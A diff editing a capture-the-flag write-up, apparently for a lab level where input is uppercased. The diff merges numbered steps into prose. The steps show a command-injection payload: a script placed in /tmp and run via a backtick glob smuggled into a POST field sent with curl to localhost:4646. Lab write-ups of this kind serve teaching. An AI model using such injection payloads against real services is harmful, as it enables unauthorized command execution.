@@ -83,25 +83,19 @@
     We understand that the parameter passed will be converted to uppercase so 
     we can't pass the `getflag` command. What we'll do is passing a script
     which executes the `getflag` command.
-    The first step is to create a file with the command we want to execute
+    In the terminal, we type the following command
     ```sh
     echo "getflag | grep -oE '[^ ]+$' > /tmp/token" > /tmp/BYPASS
     ```
-
-7. __Action__ (Guest): exploit the vulnerability in the script
-    The second step is to make our file executable by altering its rights
+    then modify the rights to `/tmp/BYPASS` to make it executable
     ```sh
     chmod +x /tmp/BYPASS
     ```
-
-8. __Action__ (Guest): exploit the vulnerability in the script
-    Once the two previous steps are done, we can pass our script to the server
+    and finally we pass it to the program
     ```sh
     curl localhost:4646 -d 'x=`/*/BYPASS`'
     ```
-
-9. __Action__ (Guest): Collect the flag
-    We can now collect the token present at the `/tmp/token` file
+    we can now collect the token present at the `/tmp/token` file
     ```sh
     cat /tmp/token
     ```
